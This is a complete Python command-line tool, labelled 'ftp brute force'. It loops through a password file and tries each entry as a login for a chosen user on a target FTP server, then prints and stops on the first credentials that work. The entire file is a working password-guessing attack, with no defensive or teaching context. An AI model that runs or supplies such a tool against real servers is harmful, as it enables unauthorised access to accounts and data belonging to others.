#!/usr/bin/env python3
import ftplib
import argparse


def cprint(*args, color="white", **kwargs):
    d = {"red": "\u001b[31m", "black": "\u001b[30m", "green": "\u001b[32m", "yellow": "\u001b[33m",
         "blue": "\u001b[34m", "white": "\u001b[37m", "end": "\u001b[0m"}

    if color not in d:
        for k in d:
            if color in k:
                color = k
                break
        else:
            color = "white"

    print(d[color], *args, d["end"], **kwargs)


def args():
    parser = argparse.ArgumentParser("ftp brute force")
    parser.add_argument("--file", help="file with passwords", required=True)
    parser.add_argument("-u", "--user", help="user name (login)", default="user")
    parser.add_argument("--ip", help="ftp server ip", required=True)
    parser.add_argument("-p", "--port", help="port", default=21, type=int)
    parser.add_argument("-t", "--timeout", help="timeout to wait server", default=5, type=int)
    return parser.parse_args()


def check_pass(user, psw, host, port, timeout):

    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=timeout)
        server.login(user, psw)

    except ftplib.error_perm:
        return False

    cprint(f"found credentials: {user},{psw}", color="g")

    return True


if __name__ == '__main__':
    options = args()
    with open(options.file) as passwords:
        for password in passwords:
            if check_pass(options.user, password.strip(), options.ip, options.port, options.timeout):
                break

